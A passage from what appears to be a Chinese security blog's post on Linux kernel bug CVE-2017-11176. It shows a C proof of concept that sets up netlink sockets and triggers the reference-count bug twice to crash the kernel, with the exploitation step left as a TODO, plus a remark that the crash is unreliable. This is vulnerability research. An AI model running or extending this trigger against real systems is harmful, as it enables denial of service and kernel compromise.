class="number">-1</span>;</span><br><span class="line">  <span class="keyword">int</span> unblock_fd = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] -=&#123; CVE-2017-11176 Exploit &#125;=-\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((sock_fd = prepare_blocking_socket()) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink socket created = %d\n&quot;</span>, sock_fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (((unblock_fd = _dup(sock_fd)) &lt; <span class="number">0</span>) || ((sock_fd2 = _dup(sock_fd)) &lt; <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] dup&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n&quot;</span>, unblock_fd, sock_fd2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// trigger the bug twice</span></span><br><span class="line">  <span class="keyword">if</span> (decrease_sock_refcounter(sock_fd, unblock_fd) ||</span><br><span class="line">      decrease_sock_refcounter(sock_fd2, unblock_fd))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] ready to crash?\n&quot;</span>);</span><br><span class="line">  PRESS_KEY();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> exploit</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] exploit failed!\n&quot;</span>);</span><br><span class="line">  PRESS_KEY();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br></pre></td></tr></table></figure>

<p>实际测试时，该PoC并不能稳定触发所使用的虚拟机Kernel Panic，需要多次运行exploit。</p>
]]></content>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
        <tag>vul</tag>
      </tags>
  </entry>
</search>
